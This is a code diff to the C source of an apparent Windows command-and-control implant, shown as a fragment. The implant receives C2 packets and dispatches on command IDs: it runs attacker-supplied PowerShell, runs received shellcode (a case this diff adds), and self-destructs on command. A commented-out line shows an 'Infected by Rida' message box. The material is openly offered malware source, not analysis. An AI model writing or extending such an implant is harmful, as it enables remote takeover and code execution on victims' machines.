@@ -1,15 +1,6 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <winternl.h>
-#include <winsock2.h>
-#include <windows.h>
-#include <wininet.h>
-#include <tlhelp32.h>
-#include <ws2tcpip.h>
-#include <windows.h>
+#include "helper.h" //has all the includes
 
 #include "Attacks/ExecutePowershell.h"
-#include "helper.h"
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "wininet.lib")
@@ -63,14 +54,8 @@ BOOL receiveC2Packet(PC2_PACKET receivedPacket){
     printf("[C2] Command ID : %lu\n", receivedPacket->CmdId);
 }
 
-BOOL SendC2Packet(PIMPLANT_PACKET sendingPacket) {
-    //TODO
-    return TRUE;
-
-}
-
 int main() {
-    //ExecPowerShell(L"powershell.exe -NoProfile -WindowStyle Hidden -Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Infected by Rida','Mouahahaha')\"");
+    //ExecPowerShell(L"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Infected by Rida','Mouahahaha')");
 
     PC2_PACKET pkt = calloc(1, sizeof(C2_PACKET));
     BOOL loop = 1;
@@ -79,9 +64,11 @@ int main() {
         switch(pkt->CmdId) {
             case 0x1:
                 printf("[C2] Received command ID 1 for {executePowershell}\n");
-                LPSTR output = ExecPowerShell(ConvertDataToLPCWSTR(pkt->Data));
-                printf("[C2] Command Output : \n%s\n=========================\n", output);
-                free(output);
+                ExecPowerShell(ConvertDataToLPCWSTR(pkt->Data));
+                break;
+            case 0x2:
+                printf("[C2] Received command ID 2 for {executeShellCode}\n");
+                ExecShellcode(pkt->Data);
                 break;
             case 0x10 :
                 printf("[C2] Starting self-destruct !");
